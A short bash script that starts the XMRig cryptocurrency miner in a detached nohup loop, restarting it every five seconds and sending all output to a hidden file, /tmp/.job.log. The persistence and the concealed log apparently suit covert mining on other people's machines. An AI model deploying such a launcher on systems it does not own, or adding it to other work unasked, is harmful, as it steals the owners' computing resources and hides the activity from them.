#!/bin/bash
cd "$(dirname "$0")/xmrig"

nohup bash -c '
while true; do
  ./xmrig --config=config.json
  sleep 5
done
' >/tmp/.job.log 2>&1 &